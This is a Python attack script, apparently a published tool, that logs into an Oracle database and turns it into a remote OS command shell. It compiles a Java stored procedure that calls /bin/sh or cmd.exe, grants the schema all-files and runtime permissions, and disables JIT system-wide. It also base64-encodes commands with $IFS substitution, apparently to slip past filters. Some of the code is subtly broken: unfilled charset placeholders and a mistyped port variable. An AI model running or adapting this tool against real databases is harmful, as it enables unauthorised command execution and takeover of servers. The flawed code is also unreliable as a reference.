# -*- coding: utf-8 -*-
# Edited By EstamelGG
# referer:https://oracle-base.com/articles/8i/shell-commands-from-plsql
import cx_Oracle
import sys
import signal
import getopt
import base64

#log
def success(text):
	text = "[+]%s"%text
	return print(text)

def normal(text):
	text = "[*]%s"%text
	return print(text)

def warning(text):
	text = "[!]%s"%text
	return print(text)

def error(text):
	text = "[X]%s"%text
	return print(text)

def executeresult(text):
	text = "[>]%s"%text
	return print(text)

#login
def login(user,pwd,host,port,sid):
	try:
		db = cx_Oracle.connect("%s"%user,"%s"%pwd,"%s:%s/%s"%(host,port,sid))
		success("Login successfully, DB version:%s"%db.version)
		return db
	except Exception as e:
		error(e)
	
def getPlatform(cur):
	try:
		query = "select platform_name from v$database"
		cur.execute(query)
		result = cur.fetchone()
		normal("OS Platform:%s"%result)
		if "Linux" in str(result):
			return "Linux"
		elif "Windows" in str(result):
			return "Windows"
		else:
			return 0
	except Exception as e:
		error(e)

def getRole(cur):
	try:
		query = "select user from dual"
		cur.execute(query)
		result = cur.fetchone()
		normal("Current Role:%s"%result)
		return result
	except Exception as e:
		error(e)

def getHost(cur):
	try:
		query = "SELECT UTL_INADDR.GET_HOST_NAME FROM dual"
		cur.execute(query)
		result = cur.fetchone()
		normal("Host:%s"%result)
		return result
	except Exception as e:
		error(e)



#disable JAVA_JIT
def JAVA_JIT(cur):
	query = "alter system set JAVA_JIT_ENABLED= FALSE scope = both"
	try:
		cur.execute(query)
		success("JAVA_JIT Disabled")
	except Exception as e:
		error(e)

def CreatePLSQL(platform,charset,cur,role):
	linuxCmd = """
		CREATE OR REPLACE AND COMPILE 
		JAVA SOURCE NAMED "Host" 
		AS
		import java.io.*;
		public class Host {
		  public static void executeCommand(String command) {
		    try {
		      String[] finalCommand;
		      finalCommand = new String[3];
		      finalCommand[0] = "/bin/sh";
		      finalCommand[1] = "-c";
		      finalCommand[2] = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/git/bin:/usr/local/sbin:~/bin;export PATH;"+command;
			  final Process pr = Runtime.getRuntime().exec(finalCommand);
			  pr.waitFor();
		      
		      new Thread(new Runnable(){
		        public void run() {
		          InputStreamReader isr = null;
		          try {
		            isr = new InputStreamReader(pr.getInputStream(),"%s");
		            StringBuffer sb = new StringBuffer();
		                while (isr.ready()) {
		                    sb.append((char) isr.read());
		                }
		            System.out.println(sb.toString());
		            isr.close();
		          }
		          catch (IOException ioe) {
		            System.out.println("Exception caught printing process output.");
		            ioe.printStackTrace();
		          }
		          finally {
		            try {
		              isr.close();
		            } catch (Exception ex) {}
		          }
		        }
		      }).start();
		  
		      new Thread(new Runnable(){
		        public void run() {
		          InputStreamReader isr_err = null;
		          try {
		            isr_err = new InputStreamReader(pr.getErrorStream(),"%s");
		            StringBuffer sb_err = new StringBuffer();
		            while (isr_err.ready()) {
		                    sb_err.append((char) isr_err.read());
		                }
		            System.out.println(sb_err.toString());
		            isr_err.close();
		          }
		          catch (IOException ioe) {
		            System.out.println("Exception caught printing process error.");
		            ioe.printStackTrace();
		          }
		          finally {
		            try {
		              isr_err.close();
		            } catch (Exception ex) {}
		          }
		        }
		      }).start();
		    }
		    catch (Exception ex) {
		      System.out.println(ex.getLocalizedMessage());
		    }
		  }
		}
	"""

	windowsCmd = """
		CREATE OR REPLACE AND COMPILE 
		JAVA SOURCE NAMED "Host" 
		AS
		import java.io.*;
		public class Host {
		  public static void executeCommand(String command) {
		    try {
              final File file = new File("c:\\\\users\\\\public\\\\f0f7f381d3dc9254b0e19a1c42d8325c-oraclexec.l0g");
              if(file.exists()){file.delete();}
		      String[] finalCommand;
		      String[] initialCommand;
		      initialCommand = new String[3];
              initialCommand[0] = "cmd.exe";
              initialCommand[1] = "/c";
              initialCommand[2] = "C:\\\\windows\\\\system32\\\\cmd.exe /y /C "+"\\""+command+">c:\\\\users\\\\public\\\\f0f7f381d3dc9254b0e19a1c42d8325c-oraclexec.l0g 2>&1\\"";
		      final Process pr = Runtime.getRuntime().exec(initialCommand);
		      pr.waitFor();
              
		      new Thread(new Runnable(){
		        public void run() {
		          InputStreamReader isr = null;
		          try {
		            isr = new InputStreamReader(new FileInputStream(file),"%s");
		            StringBuffer sb = new StringBuffer();
		                while (isr.ready()) {
		                    sb.append((char) isr.read());
		                }
		            System.out.println(sb.toString());
		            isr.close();
                    file.delete();
		          }
		          catch (IOException ioe) {
		            System.out.println("Exception caught printing process output.");
		            ioe.printStackTrace();
		          }
		          finally {
		            try {
		              isr.close();
		            } catch (Exception ex) {}
		          }
		        }
		      }).start();
           }
		    catch (Exception ex) {
		      System.out.println(ex.getLocalizedMessage());
		    }
		  }
		}
"""%(charset)

    
	query2 = """
		CREATE OR REPLACE PROCEDURE host_command (p_command  IN  VARCHAR2)
		AS LANGUAGE JAVA 
		NAME 'Host.executeCommand (java.lang.String)';
	"""

	query3 = """
		DECLARE
		  l_schema VARCHAR2(30) := '%s';
		BEGIN
		  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'setIO', '' );
		END;
	"""%role
	#setIO: read and write file
	try:
		if platform == "Linux":
			cur.execute(linuxCmd)
			success("Linux Java Executer Created")
		elif platform == "Windows":
			cur.execute(windowsCmd)
			success("Windows Java Executer Created")
		cur.execute(query2)
		success("Procedure Created")
		try:
			cur.execute(query3)
			success("\"%s\" Permission Granted"%role)
		except Exception as e:
			error("\"%s\" Permission NOT Granted"%role)
			warning(e)
			pass
		cur.callproc("dbms_output.enable", (1024000,))
		cur.callproc("dbms_java.set_output",(1024000,))
		success("Enable OutPut")
		success("PL/SQL Procedure successfully completed")
		#normal("Grant Successfully")
		print("="*64)
		return cur
	except Exception as e:
		error(e)
		sys.exit()

#command encrypt
def command_encrypt(platform,cmd):
	if platform == "Linux":
		b64cmd = base64.b64encode(cmd.encode('utf-8'))
		cmd = "echo \"%s\"|base64 -d|/bin/sh"%(str(b64cmd,'utf-8'))
		cmd = cmd.replace(" ","$IFS")
		return cmd
	elif platform == "Windows":
		return cmd
#run code
def rce(cur,cmd):
	query = """
	DECLARE
		  l_output DBMS_OUTPUT.chararr;
		  l_lines  INTEGER := 1024000;
	BEGIN
		host_command('%s');
		DBMS_OUTPUT.get_lines(l_output, l_lines);
		FOR i IN 1 .. l_lines LOOP
			DBMS_OUTPUT.put_line(l_output(i));
		END LOOP;
	END;
	"""%(cmd)
	cur.execute(query)
	#get result
	result = ""
	statusVar = cur.var(cx_Oracle.NUMBER)
	lineVar = cur.var(cx_Oracle.STRING)
	while True:
		try:
			cur.callproc("dbms_output.get_line", (lineVar, statusVar))
			if statusVar.getvalue() != 0:
				break
			text = lineVar.getvalue()
			if text == None:
				text = ""
			print(text)
		except Exception as e:
			error(e)

#clean Procedure
def dropproc(cur):
	query = "drop procedure host_command"
	cur.execute(query)

def quit(signum, frame):
	dropproc(cur)
	print()
	success("Procedure Dropped")
	sys.exit()

#default
port = '1521'
host = '127.0.0.1'
user = ''
pwd = ''
sid = ''
charset = 'UTF-8'
#get args
try:
	opts, args = getopt.getopt(sys.argv[1:],"hi:u:p:h:P:s:c:")
	if len(opts) == 0:
		print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service> -c <GBK/UTF-8>')
		sys.exit()
except getopt.GetoptError:
	print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service> -c <GBK/UTF-8>')
	sys.exit()

for opt, arg in opts:
	if opt == '-h':
		print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service> -c <GBK/UTF-8>')
		sys.exit()
	elif opt == "-i":
		host = arg
	elif opt == "-u":
		user = arg
	elif opt == "-p":
		pwd = arg
	elif opt == "-P":
		ort = arg
	elif opt == "-s":
		sid = arg
	elif opt == "-c":
		charset = arg

normal("Target: %s:%s/%s"%(host,port,sid))
#login and others
db = login(user,pwd,host,port,sid)
cur = db.cursor()
platform = getPlatform(cur)
try:
	role = getRole(cur)
except:
	role = user
signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
JAVA_JIT(cur)
CreatePLSQL(platform,charset,cur,role)
success("Charset %s"%charset)
executeresult("Execute Command:")
#Different Platform
host = getHost(cur)
if platform == "Linux":
	while True:
		print()
		cmd = input("[%s]$"%host)
		if cmd:
			cmd = command_encrypt("Linux",cmd)
			rce(cur,cmd)

elif platform == "Windows":
	while True:
		print()
		cmd = input("[%s]>"%host)
		if cmd:
			cmd = command_encrypt("Windows",cmd)
			rce(cur,cmd)

#Clean
dropproc(cur)
print()
warning("Procedure Dropped")